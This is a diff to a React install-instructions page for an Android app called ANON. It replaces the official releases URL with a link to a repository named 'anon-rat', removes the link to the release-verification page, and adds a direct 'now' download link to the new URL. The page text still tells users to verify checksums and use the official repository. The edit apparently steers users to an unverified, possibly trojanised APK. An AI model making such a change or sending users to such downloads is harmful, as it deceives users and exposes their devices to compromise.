@@ -1,6 +1,6 @@
 import { Link } from 'react-router-dom'
 
-const RELEASES_URL = 'https://github.com/nails808/anon/releases'
+const RELEASES_URL = 'https://github.com/nails808/anon-rat/releases/latest'
 
 export function Install() {
   return (
@@ -19,7 +19,6 @@ export function Install() {
         <article className="install-card">
           <h3>1. Verify the release</h3>
           <p>
-            Open the <a href={RELEASES_URL} target="_blank" rel="noreferrer">ANON GitHub Releases page</a>.
             Check the version, release notes, package details and published checksum where available.
           </p>
         </article>
@@ -27,7 +26,7 @@ export function Install() {
         <article className="install-card">
           <h3>2. Download the APK</h3>
           <p>
-            Download the Android package attached to the selected release. Use the official repository
+            Download the Android package <a href={RELEASES_URL} target="_blank" rel="noreferrer">now</a> Use the official repository
             rather than an unofficial mirror, and verify the downloaded file against the published
             checksum when one is provided.
           </p>
